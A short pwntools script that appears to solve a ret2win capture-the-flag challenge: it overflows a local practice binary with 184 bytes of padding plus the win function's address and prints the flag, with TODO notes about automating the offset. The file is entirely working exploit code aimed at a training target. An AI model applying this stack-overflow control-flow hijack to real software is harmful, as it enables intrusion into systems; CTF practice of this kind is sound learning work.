from pwn import *
from fart import analyze

# make everything shut up!!!
context.log_level = 'warning'

binary = './bins2/bin-ret2win-0'
#e = ELF(binary)
analyzer = analyze(binary)
io = process(binary)
buf = b'A'*184
#win = p64(e.sym['win'])
win = p64(analyzer.get_win())
io.sendline(buf + win)
io.recvuntil(b'flag{')
print('flag{' + io.recvuntil(b'}').decode('utf-8'))

#TODO
# from AEG get lenght of crap before win
# get args to win if they exist
